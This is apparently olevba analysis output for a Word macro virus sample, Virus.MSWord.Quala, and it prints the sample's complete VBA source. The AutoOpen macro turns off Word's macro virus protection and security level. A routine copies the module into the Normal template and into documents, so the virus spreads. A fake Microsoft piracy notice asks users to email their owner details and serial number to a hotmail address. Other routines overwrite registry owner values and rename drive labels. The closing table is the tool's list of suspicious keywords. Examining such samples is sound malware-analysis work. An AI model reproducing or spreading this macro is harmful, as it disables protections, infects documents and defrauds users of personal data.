olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Quala-fe5d909c023963ea8cbd67629c7ed11af44eb4cb
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Quala-fe5d909c023963ea8cbd67629c7ed11af44eb4cb - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO QuakeLab.bas 
in file: Virus.MSWord.Quala-fe5d909c023963ea8cbd67629c7ed11af44eb4cb - OLE stream: 'Macros/VBA/QuakeLab'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Declare Function SetVolumeLabel Lib "kernel32" Alias "SetVolumeLabelA" (ByVal lpRootPathName As String, ByVal lpVolumeName As String) As Long
Public Function SetLabel(RootName As String, NewLabel As String)
If RootName = "" Then
Exit Function
End If
Call SetVolumeLabel(RootName, NewLabel)
End Function
Sub ToolsMacro()
On Error GoTo Error
Formact
Error:
End Sub
Sub AutoOpen()
On Error Resume Next
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
  CommandBars("Macro").Controls("Security...").Enabled = False
  System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
  Else
  CommandBars("Tools").Controls("Macro").Enabled = True
  Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
End If
Options.SaveNormalPrompt = False
 Application.Options.VirusProtection = False
Application.Options.ConfirmConversions = False
Application.ActiveDocument.AcceptAllRevision
Call Normat
End Sub
Sub ViewVBCode()
Call Formact
End Sub
Sub Normat()
On Error Resume Next
ModulName = "QuakeLab"
FileName = "~chk00001.tmp"
If MacroContainer = NormalTemplate Then
  Set Carrier = NormalTemplate.VBProject.VBComponents
  Set host = ActiveDocument.VBProject.VBComponents
Else
  Set Carrier = ActiveDocument.VBProject.VBComponents
  Set host = NormalTemplate.VBProject.VBComponents
End If
s1 = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "SystemRoot")
If host(ModulName).Name <> ModulName Then
  Carrier(ModulName).Export "c:\~chk00001.tmp"
  host.Import ("c:\~chk00001.tmp")
Kill ("c:\~chk00001.tmp")
End If
If ActiveDocument.Content.Characters.Count = 0 Then ActiveDocument.Saved = True Else ActiveDocument.save
End Sub
Sub ViewCode()
k = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "Version")
Output = " No way..!  Please obtain Original version of " & k
MsgBox (Output), 16, "Warning !"
End Sub
Sub Formact()
e = Month(Now)
k = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "Version")
Output = "The " & k & " version Installed in your computer seems to be a pirated copy. Microsoft has the rights to take action against using illegal copies of it's product. Some of the options are disabled in your computer.To enable these option, E.mail the the Name and Address of the Registered owner with E.mail address & Serial number to win_op_sys@hotmail.com . You will be exempted from punishment.                                                                                                                                                                                                                           -Microsoft Corporation"
MsgBox (Output), 48, "Warning !"
If e > "8" Then
Call SetLabel("c:\", "AnthraxC")
Call SetLabel("d:\", "AnthraxD")
Call SetLabel("e:\", "AnthraxE")
Call SetLabel("f:\", "AnthraxF")
Call SetLabel("g:\", "AnthraxG")
Call SetLabel("h:\", "AnthraxH")
Else
End If
End Sub
Sub FileSave()
On Error GoTo EFR
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "Dr.Anthrax" Then
Else
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "Dr.Anthrax"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOrganization") = "Quake Labs"
End If
ActiveDocument.save
EFR:
End Sub
Sub InsertPageNumbers()
    If ActiveWindow.View.SplitSpecial <> wdPaneNone Then
        ActiveWindow.Panes(2).Close
    End If
    If ActiveWindow.ActivePane.View.Type = wdNormalView Or ActiveWindow. _
        ActivePane.View.Type = wdOutlineView Or ActiveWindow.ActivePane.View.Type _
         = wdMasterView Then
        ActiveWindow.ActivePane.View.Type = wdPageView
    End If
    ActiveWindow.ActivePane.View.SeekView = wdSeekCurrentPageHeader
    If Selection.HeaderFooter.IsHeader = True Then
        ActiveWindow.ActivePane.View.SeekView = wdSeekCurrentPageFooter
    Else
        ActiveWindow.ActivePane.View.SeekView = wdSeekCurrentPageHeader
    End If
    Selection.WholeStory
    Selection.Delete Unit:=wdCharacter, Count:=1
    Selection.ParagraphFormat.Alignment = wdAlignParagraphRight
    Selection.TypeText Text:="Quake Labs"
    Selection.HomeKey Unit:=wdLine
    Selection.Fields.Add Range:=Selection.Range, Type:=wdFieldPage
    Selection.TypeText Text:=" "
    ActiveWindow.ActivePane.View.SeekView = wdSeekMainDocument
End Sub






+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

